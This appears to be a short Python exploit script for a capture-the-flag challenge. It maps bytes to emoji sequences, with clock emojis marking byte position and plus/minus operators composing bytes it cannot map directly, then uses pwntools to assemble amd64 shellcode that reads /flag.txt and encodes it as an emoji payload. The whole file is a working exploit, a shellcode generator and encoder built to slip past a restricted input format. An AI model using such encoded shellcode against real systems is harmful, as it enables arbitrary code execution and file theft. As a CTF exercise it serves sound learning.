#!/usr/bin/env python3

emojis = [
        '😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂',
        '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩',
        '😘', '😗', '😚', '😙', '🥲', '😋', '😛', '😜',
        '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐',
        '🤨', '😐️', '😑', '😶', '😏', '😒', '🙄', '😬',
        '🤥', '😌', '😔', '😪', '😮', '💨', '🤤', '😴',
        '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶',
        '😶', '🥴', '😵', '💫', '😵', '🤯', '🤠', '🥳',
        '🥸', '😎', '🤓', '🧐', '😕', '😟', '🙁', '😮',
        '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰',
        '😥', '😢', '😭', '😱', '😖', '😣', '😞', '😓',
        '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈',
        '👿', '💀', '💩', '🤡', '👹', '👺', '👻', '👽️',
        '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽',
        '🙀', '😿', '😾', '🙈', '🙉', '🙊', '👋', '🤚',
        '🤟', '🤘', '🤙', '👈️', '👉️', '👆️', '🖕', '👇️',
        '👍️', '👎️', '✊', '👊', '🤛', '🤜', '👏', '🙌',
        '👐', '🤲', '🤝', '🙏', '🤳', '💪', '🦾', '🦿',
        '🦵', '🦶', '👂️', '🦻', '👃', '🧠', '🫀', '🫁',
        '🦷', '🦴', '👀', '👄', '💋', '👶', '🧒', '👦',
        '👧', '🧑', '👨', '👩', '🧔', '🧔', '👤', '👥',
        '🫂', '👣', '👕', '👖', '👔', '👗', '👙', '👘',
        '👠', '👡', '👢', '👞', '👟', '👒', '🎩', '🎓',
        '👑', '🎒', '👝', '👛', '👜', '💼', '👓', '🤿',
        '🌂', '🧣', '🧤', '🧥', '🦺', '🥻', '🩱', '🩲',
        ]

clocks = ['🕐', '🕑', '🕒', '🕓']
plus = '➕'
minus = '➖'
run = '🏃'

bytemap = {}

for emoji in emojis:
    encoded = emoji.encode('utf-8')
    for byte in encoded[0:4]:
        if byte not in bytemap:
            bytemap[byte] = emoji + clocks[encoded.index(byte)]

bytemap_append = {}

for i in range(0, len(bytemap)):
    for j in range(i, len(bytemap)):
        op_i = list(bytemap)[i]
        op_j = list(bytemap)[j]

        add = (op_i + op_j) % 0x100
        if add not in bytemap and add not in bytemap_append:
            bytemap_append[add] = bytemap[op_i] + plus + bytemap[op_j]

        sub1 = (op_i - op_j) % 0x100
        if sub1 not in bytemap and sub1 not in bytemap_append:
            bytemap_append[sub1] = bytemap[op_i] + minus + bytemap[op_j]

        sub2 = (op_j - op_i) % 0x100
        if sub2 not in bytemap and sub2 not in bytemap_append:
            bytemap_append[sub2] = bytemap[op_j] + minus + bytemap[op_i]

bytemap = bytemap | bytemap_append

print(f"loaded {len(bytemap)} / 256 bytes")

from pwn import *

context.update(arch="amd64", os="linux", bits = 64, endianness = 'little')

shellcode = asm(shellcraft.cat(b'/flag.txt'))

payload = run

for byte in shellcode:
    payload += bytemap[byte]

print(payload)
